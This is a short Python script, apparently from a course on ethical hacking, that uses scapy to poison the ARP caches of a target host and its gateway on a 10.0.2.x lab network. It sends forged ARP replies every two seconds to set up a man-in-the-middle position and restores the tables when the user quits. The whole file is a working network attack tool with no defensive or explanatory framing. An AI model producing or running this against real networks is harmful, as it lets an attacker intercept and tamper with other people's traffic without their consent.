#!/usr/bin/env python

""" I run pyth 3 by default. commented lines are required to run this script in pyth 2"""
import scapy.all as scapy
import time
#import sys

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(dest_ip, source_ip):
    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send (packet, count=4, verbose=False)


target_ip = "10.0.2.4"
gateway_ip = "10.0.2.1"

try:
    packetcount = 0
    while True:

        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        packetcount = packetcount + 2
        print("\r[*] PACKETS SENT = " + str(packetcount), end="") #,
        #sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[*] PROGRAM QUIT")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    print("[*] ARP TABLES RESTORED")

